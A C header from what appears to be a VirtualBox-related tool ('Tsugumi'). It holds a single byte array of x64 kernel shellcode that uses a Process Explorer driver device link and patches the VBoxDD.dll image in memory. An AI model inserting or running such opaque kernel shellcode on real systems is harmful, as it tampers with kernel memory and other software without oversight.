/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       TSMISC.H
*
*  VERSION:     1.00
*
*  DATE:        24 Jan 2020
*
*  Tsugumi as shellcode.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

BYTE x64kernelcode[1055] = {
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0xB8, 0x1A, 0xC0, 0xED, 0x1C, 0xDE, 0xC0, 0x37, 0x13,
    0x48, 0x8B, 0xDA, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8D, 0x05, 0x51, 0x00, 0x00, 0x00, 0x48,
    0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x83, 0x38,
    0x01, 0x74, 0x1A, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x8D, 0x0D, 0x61, 0x02, 0x00, 0x00, 0xC7,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x38, 0xFF, 0x50, 0x48, 0x48, 0x8B, 0x44,
    0x24, 0x38, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0xC7, 0x43, 0x30, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x50,
    0x18, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x18, 0x55, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x60, 0x48, 0xB8, 0x1A,
    0xC0, 0xED, 0x1C, 0xDE, 0xC0, 0x37, 0x13, 0xC7, 0x45, 0xD0, 0x5C, 0x00, 0x44, 0x00, 0x48, 0x89,
    0x45, 0x10, 0x48, 0x8B, 0xD9, 0x33, 0xC0, 0xC7, 0x45, 0xD4, 0x6F, 0x00, 0x73, 0x00, 0x66, 0x89,
    0x45, 0xFC, 0x48, 0x8D, 0x0D, 0xF7, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x45, 0x10, 0xC7, 0x45, 0xD8,
    0x44, 0x00, 0x65, 0x00, 0xC7, 0x45, 0xDC, 0x76, 0x00, 0x69, 0x00, 0xC7, 0x45, 0xE0, 0x63, 0x00,
    0x65, 0x00, 0xC7, 0x45, 0xE4, 0x73, 0x00, 0x5C, 0x00, 0xC7, 0x45, 0xE8, 0x50, 0x00, 0x52, 0x00,
    0xC7, 0x45, 0xEC, 0x4F, 0x00, 0x43, 0x00, 0xC7, 0x45, 0xF0, 0x45, 0x00, 0x58, 0x00, 0xC7, 0x45,
    0xF4, 0x50, 0x00, 0x31, 0x00, 0xC7, 0x45, 0xF8, 0x35, 0x00, 0x32, 0x00, 0xFF, 0x50, 0x50, 0x48,
    0x8B, 0x45, 0x10, 0x48, 0x8D, 0x55, 0xD0, 0x48, 0x8D, 0x4D, 0xC0, 0xFF, 0x90, 0x80, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0x45, 0x10, 0x48, 0x8D, 0x4D, 0xC0, 0xFF, 0x50, 0x30, 0x48, 0x8B, 0x45, 0x10,
    0x48, 0x8B, 0x4B, 0x08, 0xFF, 0x50, 0x28, 0x48, 0x8B, 0x45, 0x10, 0x48, 0xC7, 0x45, 0x18, 0x60,
    0x79, 0xFE, 0xFF, 0x83, 0x78, 0x04, 0x00, 0x74, 0x20, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0x45, 0x10, 0x4C, 0x8D, 0x45, 0x18, 0x33, 0xD2, 0x33, 0xC9, 0xFF, 0x50, 0x38, 0x48,
    0x8B, 0x45, 0x10, 0x83, 0x78, 0x04, 0x00, 0x75, 0xE7, 0x48, 0x8B, 0x45, 0x10, 0x4C, 0x8D, 0x45,
    0x18, 0x33, 0xD2, 0x33, 0xC9, 0xFF, 0x50, 0x38, 0x48, 0x8B, 0x9C, 0x24, 0x80, 0x00, 0x00, 0x00,
    0x48, 0x83, 0xC4, 0x60, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x57,
    0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x40, 0x41, 0x8B, 0xF1, 0x49,
    0x8B, 0xF8, 0x4C, 0x8B, 0xEA, 0x4C, 0x8B, 0xF9, 0x45, 0x33, 0xF6, 0x4C, 0x89, 0x74, 0x24, 0x20,
    0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x8B, 0xD6, 0x48, 0x8B, 0xCF, 0x41, 0xFF, 0x57, 0x10, 0x48,
    0x8B, 0xD8, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x85, 0xC0, 0x75, 0x0A, 0xB8, 0x9A, 0x00, 0x00,
    0xC0, 0xE9, 0xB3, 0x00, 0x00, 0x00, 0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x00, 0x00,
    0x48, 0x3B, 0xF8, 0x72, 0x0A, 0xB8, 0x18, 0x00, 0x00, 0xC0, 0xE9, 0x9A, 0x00, 0x00, 0x00, 0x45,
    0x33, 0xC0, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0x41, 0xFF, 0x57, 0x70, 0xF6, 0x43, 0x0A, 0x05, 0x74,
    0x06, 0x4C, 0x8B, 0x63, 0x18, 0xEB, 0x20, 0xC7, 0x44, 0x24, 0x28, 0x20, 0x00, 0x00, 0x40, 0x44,
    0x89, 0x74, 0x24, 0x20, 0x45, 0x33, 0xC9, 0x33, 0xD2, 0x45, 0x8D, 0x41, 0x01, 0x48, 0x8B, 0xCB,
    0x41, 0xFF, 0x57, 0x78, 0x4C, 0x8B, 0xE0, 0x4D, 0x85, 0xE4, 0x74, 0x31, 0xBA, 0x04, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0xCB, 0x41, 0xFF, 0x57, 0x58, 0x44, 0x8B, 0xF0, 0x89, 0x44, 0x24, 0x30, 0x48,
    0x8B, 0xCE, 0x49, 0x8B, 0xFC, 0x49, 0x8B, 0xF5, 0xF3, 0xA4, 0x48, 0x8B, 0xD3, 0x49, 0x8B, 0xCC,
    0x41, 0xFF, 0x57, 0x60, 0x48, 0x8B, 0xCB, 0x41, 0xFF, 0x57, 0x68, 0xEB, 0x0B, 0x41, 0xBE, 0x05,
    0x00, 0x00, 0xC0, 0x44, 0x89, 0x74, 0x24, 0x30, 0xEB, 0x15, 0x41, 0xBE, 0x05, 0x00, 0x00, 0xC0,
    0x44, 0x89, 0x74, 0x24, 0x30, 0x4C, 0x8B, 0x7C, 0x24, 0x70, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48,
    0x8B, 0xCB, 0x41, 0xFF, 0x57, 0x20, 0x41, 0x8B, 0xC6, 0x48, 0x8B, 0x5C, 0x24, 0x78, 0x48, 0x8B,
    0xB4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D,
    0x41, 0x5C, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x6C, 0x24, 0x18, 0x56, 0x57, 0x41, 0x56, 0x48, 0x83,
    0xEC, 0x40, 0x48, 0xB8, 0x1A, 0xC0, 0xED, 0x1C, 0xDE, 0xC0, 0x37, 0x13, 0x49, 0x8B, 0xF0, 0x48,
    0x89, 0x44, 0x24, 0x60, 0x48, 0x8B, 0xEA, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x4C, 0x8B, 0xF1, 0xF0,
    0xFF, 0x40, 0x04, 0x33, 0xFF, 0xC7, 0x44, 0x24, 0x20, 0x56, 0x00, 0x42, 0x00, 0xC7, 0x44, 0x24,
    0x24, 0x6F, 0x00, 0x78, 0x00, 0x8B, 0xDF, 0xC7, 0x44, 0x24, 0x28, 0x44, 0x00, 0x44, 0x00, 0xC7,
    0x44, 0x24, 0x2C, 0x2E, 0x00, 0x64, 0x00, 0xC7, 0x44, 0x24, 0x30, 0x6C, 0x00, 0x6C, 0x00, 0x66,
    0x89, 0x7C, 0x24, 0x34, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0xF6, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC0,
    0x0F, 0x84, 0xED, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x60, 0xFF, 0x50, 0x40, 0x48, 0x3B,
    0xC5, 0x0F, 0x85, 0xDC, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x4E, 0x08, 0x4D, 0x85, 0xC9, 0x0F, 0x84,
    0xCF, 0x00, 0x00, 0x00, 0x41, 0x0F, 0xB7, 0x06, 0x66, 0x85, 0xC0, 0x0F, 0x84, 0xC2, 0x00, 0x00,
    0x00, 0x44, 0x8B, 0xC0, 0x8B, 0xCF, 0x41, 0xD1, 0xE8, 0x74, 0x1B, 0x49, 0x8B, 0xD1, 0x66, 0x90,
    0xFF, 0xC1, 0x66, 0x83, 0x3A, 0x5C, 0x48, 0x8D, 0x52, 0x02, 0x8B, 0xC1, 0x0F, 0x45, 0xC3, 0x8B,
    0xD8, 0x41, 0x3B, 0xC8, 0x72, 0xEA, 0x4C, 0x8B, 0x54, 0x24, 0x60, 0x48, 0x8D, 0x44, 0x24, 0x20,
    0x49, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x49, 0xFF, 0xC0, 0x66, 0x42, 0x39, 0x3C, 0x40, 0x75, 0xF6, 0x8B, 0xC3, 0x48, 0x8D, 0x54, 0x24,
    0x20, 0x49, 0x8D, 0x0C, 0x41, 0x41, 0xFF, 0x52, 0x08, 0x85, 0xC0, 0x75, 0x66, 0x48, 0x8B, 0x5C,
    0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x81, 0xC3, 0x8C, 0x00, 0x00, 0x00, 0x83, 0xB8,
    0x88, 0x00, 0x00, 0x00, 0x05, 0x76, 0x4C, 0x0F, 0xB6, 0x4B, 0x04, 0x84, 0xC9, 0x74, 0x1C, 0x44,
    0x8B, 0x03, 0x48, 0x8D, 0x53, 0x05, 0x4C, 0x03, 0x46, 0x08, 0x44, 0x8B, 0xC9, 0x48, 0x8B, 0x4C,
    0x24, 0x60, 0xE8, 0x99, 0xFD, 0xFF, 0xFF, 0x0F, 0xB6, 0x4B, 0x04, 0x0F, 0xB6, 0xC1, 0x83, 0xC0,
    0x05, 0x03, 0xF8, 0x0F, 0xB6, 0xC1, 0x48, 0x83, 0xC0, 0x05, 0x48, 0x03, 0xD8, 0x48, 0x8B, 0x44,
    0x24, 0x60, 0x8B, 0x88, 0x88, 0x00, 0x00, 0x00, 0x8B, 0xC7, 0x48, 0x83, 0xC0, 0x05, 0x48, 0x3B,
    0xC1, 0x72, 0xB4, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x5C, 0x24, 0x68, 0x48, 0x8B, 0x6C,
    0x24, 0x70, 0xF0, 0xFF, 0x48, 0x04, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5E, 0x5F, 0x5E, 0xC3
};